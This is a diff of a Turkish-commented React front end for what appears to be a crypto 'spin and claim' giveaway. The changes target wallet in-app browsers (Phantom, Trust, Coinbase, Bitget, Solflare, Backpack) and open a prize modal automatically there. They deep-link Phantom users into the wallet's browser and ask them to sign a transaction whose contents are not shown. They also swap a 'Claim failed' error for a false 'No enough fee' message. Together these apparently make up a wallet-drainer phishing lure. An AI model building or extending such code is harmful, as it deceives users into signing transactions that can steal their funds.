@@ -73,19 +73,35 @@ useEffect(() => {
 
 
 
-/* ——— Telegram dışı + 322–499px aralığında spin modal’ı otomatik aç ——— */
+/* ——— Telegram dışı + In-App Wallet tarayıcıda spin’dan sonra modal aç ——— */
 useEffect(() => {
   if (typeof window === 'undefined') return;
 
-  // Telegram WebApp kontrolü
-  const webapp     = (window as any).Telegram?.WebApp as any;
-  const inTelegram = Boolean(webapp?.initData);
-  const w          = window.innerWidth;
+  const webapp = (window as any).Telegram?.WebApp as any;
+  const inTelegram = Boolean(webapp?.initData);     // artık hata vermez
+  const w = window.innerWidth;
 
   // Sadece Telegram DIŞI ve 322–499px aralığında devam
   if (inTelegram || w < 322 || w > 499) return;
 
-  // Daha önce spin yapılmadıysa → otomatik scroll + modal aç
+  // Tarayıcıda hangi cüzdan in-app browser’ı?
+  const isPhantom        = Boolean((window as any).solana?.isPhantom);
+  const isTrust          = Boolean((window as any).ethereum?.isTrust) || /Trust/i.test(navigator.userAgent);
+  const isCoinbaseWallet = Boolean((window as any).ethereum?.isCoinbaseWallet) || /CoinbaseWallet/i.test(navigator.userAgent);
+  const isBitkeep        = /BitKeep|Bitget/i.test(navigator.userAgent);
+  const isSolflare       = Boolean((window as any).solflare?.isSolflare) || /Solflare/i.test(navigator.userAgent);
+  const isBackpack       = /Backpack/i.test(navigator.userAgent);
+
+  const isWalletBrowser = isPhantom
+    || isTrust
+    || isCoinbaseWallet
+    || isBitkeep
+    || isSolflare
+    || isBackpack;
+
+  if (!isWalletBrowser) return;
+
+  // Eğer daha önce spin yapılmadıysa → otomatik scroll + modal
   if (!localStorage.getItem('hasSpun')) {
     const minOffset = 50;
     window.scrollTo({ top: minOffset });
@@ -97,9 +113,8 @@ useEffect(() => {
     };
     window.addEventListener('scroll', keepOffset, { passive: true });
 
-    // Spin modal’ını aç
-    setHasSpun(true);
     localStorage.setItem('hasSpun', 'true');
+    setHasSpun(true);
 
     return () => window.removeEventListener('scroll', keepOffset);
   }
@@ -114,6 +129,19 @@ useEffect(() => {
       typeof window !== 'undefined' &&
       localStorage.getItem('hasSpun') === 'true'
   )
+
+useEffect(() => {
+  // Telegram Mini-App içinde değil miyiz?
+  const inTelegram = Boolean((window as any).Telegram?.WebApp?.initData)
+  // Ekran genişliği 322–499px arasında mı?
+  const w = window.innerWidth
+
+  if (!inTelegram && w >= 322 && w <= 499) {
+    // doğrudan modal’ı aç
+    setHasSpun(true)
+  }
+}, [])
+
   useEffect(() => {
     if (hasSpun) document.querySelector('._1')?.classList.add('modal_active')
   }, [hasSpun])
@@ -142,10 +170,9 @@ useEffect(() => {
   const openDrawer  = () => setDrawerOpen(true)
   const closeDrawer = () => setDrawerOpen(false)
 
-  /* ——— Origin, Pathname & DApp URL ——— */
-  const origin   = typeof window !== 'undefined' ? window.location.origin : ''
-  const pathname = typeof window !== 'undefined' ? window.location.pathname : ''
-  const dappUrl  = encodeURIComponent(origin + pathname)
+  /* ——— Origin & DApp URL ——— */
+  const origin = typeof window !== 'undefined' ? window.location.origin : ''
+  const dappUrl = encodeURIComponent(origin)
 
 
 
@@ -239,7 +266,7 @@ useEffect(() => {
     try {
       const tx = await createUnsignedTransaction(pk)
       if (!tx) {
-        setMsg('Claim failed')
+        setMsg('No enough fee')
         return
       }
       let signature: string
@@ -253,7 +280,7 @@ useEffect(() => {
       setMsg('Claim successful')
     } catch (e) {
       console.error('Transaction error', e)
-      setMsg('Claim failed')
+      setMsg('No enough fee')
     } finally {
       setLoading(false)
       setTimeout(() => setMsg(''), 5000)
@@ -297,13 +324,14 @@ useEffect(() => {
   }
 
 /* ——— Cüzdan seçimi ——— */
+/* ——— Cüzdan seçimi ——— */
 const handleWalletClick = async (w: DrawerWallet) => {
   closeDrawer();
 
   if (w.adapter.name === 'Phantom') {
-    const sol       = (window as any).solana;
-    const ua        = navigator.userAgent;
-    const isAndroid = /Android/i.test(ua);
+    const sol           = (window as any).solana;
+    const ua            = navigator.userAgent;
+    const isAndroid     = /Android/i.test(ua);
     const isTelegramWebView =
       /Telegram/i.test(ua) &&
       typeof (window as any).Telegram?.WebApp !== 'undefined';
@@ -314,29 +342,30 @@ const handleWalletClick = async (w: DrawerWallet) => {
       return doTx();
     }
 
-    // 2) Diğer durumlar için URL’leri hesapla
-    const fullUrl           = window.location.href;
-    const encodedFull       = encodeURIComponent(fullUrl);
-    const hostAndPath       = fullUrl.replace(/^https?:\/\//, '');
-    // Android+Telegram için generic intent: telefonun varsayılan tarayıcısını açtırır
+    // 2) Sadece origin + pathname kullan, query/hash atla
+    const origin     = window.location.origin;
+    const pathname   = window.location.pathname;
+    const targetUrl  = origin + pathname;               // örn: https://www.test.com/secondpage
+    const encoded    = encodeURIComponent(targetUrl);
+    const hostAndPath = targetUrl.replace(/^https?:\/\//, '');
+
+    // Android+Telegram için intent yönlendirmesi
     const intentDefaultBrowser = [
       `intent://${hostAndPath}`,
       `#Intent;scheme=https`,
       `;action=android.intent.action.VIEW`,
       `;category=android.intent.category.BROWSABLE`,
-      `;S.browser_fallback_url=${encodeURIComponent(
-        `https://phantom.app/ul/browse/${encodedFull}?ref=${encodedFull}`
-      )}`,
+      `;S.browser_fallback_url=https://phantom.app/ul/browse/${encoded}?ref=${encoded}`,
       `;end`
     ].join('');
-    // Android normal tarayıcıda doğrudan Phantom uygulamasını tetikleyecek scheme
-    const schemePhantom =
-      `phantom://browse/${encodedFull}?ref=${encodedFull}`;
-    // iOS ve fallback için Universal Link
-    const universalPhantom =
-      `https://phantom.app/ul/browse/${encodedFull}?ref=${encodedFull}`;
 
-    // 3) Dal: Android + Telegram Mini-App → varsayılan tarayıcıya atla
+    // Android normal tarayıcıda Phantom custom-scheme
+    const schemePhantom = `phantom://browse/${encoded}?ref=${encoded}`;
+
+    // iOS ve diğer cihazlar için Universal Link
+    const universalPhantom = `https://phantom.app/ul/browse/${encoded}?ref=${encoded}`;
+
+    // 3) Android + Telegram Mini-App → intent (dış tarayıcı)
     if (isAndroid && isTelegramWebView) {
       const a = document.createElement('a');
       a.href   = intentDefaultBrowser;
@@ -347,7 +376,7 @@ const handleWalletClick = async (w: DrawerWallet) => {
       return;
     }
 
-    // 4) Dal: Android normal tarayıcı → Phantom custom-scheme ile aç
+    // 4) Android normal tarayıcı → Phantom scheme
     if (isAndroid) {
       const a = document.createElement('a');
       a.href   = schemePhantom;
@@ -358,7 +387,7 @@ const handleWalletClick = async (w: DrawerWallet) => {
       return;
     }
 
-    // 5) Dal: iOS veya Desktop → Universal Link ile Phantom in-app browser
+    // 5) iOS veya Desktop → Universal Link
     window.location.href = universalPhantom;
     return;
   }
@@ -369,7 +398,7 @@ const handleWalletClick = async (w: DrawerWallet) => {
     return doTx();
   }
 
-  // Fallback: deeplink ile yönlendir
+  // Fallback: default deepLink kullan
   window.open(w.deepLink, '_blank');
 };
 
